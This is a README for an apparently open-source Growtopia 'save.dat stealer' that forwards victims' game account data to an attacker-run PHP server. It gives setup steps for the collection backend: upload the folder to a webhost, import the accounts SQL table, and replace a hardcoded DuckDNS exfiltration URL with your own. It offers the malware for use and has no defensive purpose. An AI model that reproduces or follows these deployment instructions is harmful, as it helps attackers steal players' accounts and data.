## trash
- this projects successor = https://pollery.eu

trash - growtopia save.dat stealer that uses a http server to store data(aka "forwarder")
## Important
- No, don't expect help from me this has been discontinued ages ago
- this has been released for the memes
## Installation
- simply upload the "trash" folder to your webhost

- after you've done that import the .sql file i left in trash folder

> if ure using some free webhost that doesnt let u name databases the way u want then open the .sql file and copy the CREATE TABLE accounts (...)...;

- and now u can edit db details in all the php scripts

basically the code is an inefficient shitmess so just use Find+Replace on the whole solution(ctrl+H)

find: "http://trashserver69.duckdns.org/trash"

replace with ur URL to the folder with php scripts

- epic it should work now
## Notes
- original src has been lost(unfortunately) and this is a (v0.19 i think) so its not the latest
- this has been exported to a vs project through dnspy so u cant directly edit forms design because theres no .resx files(you can fix it tho)
- server is vulnerable to shit aka unsafe as fuck so improve it
- theres lots of bugs
- stability is kinda shit
- bad optimization
- some parts are pasted
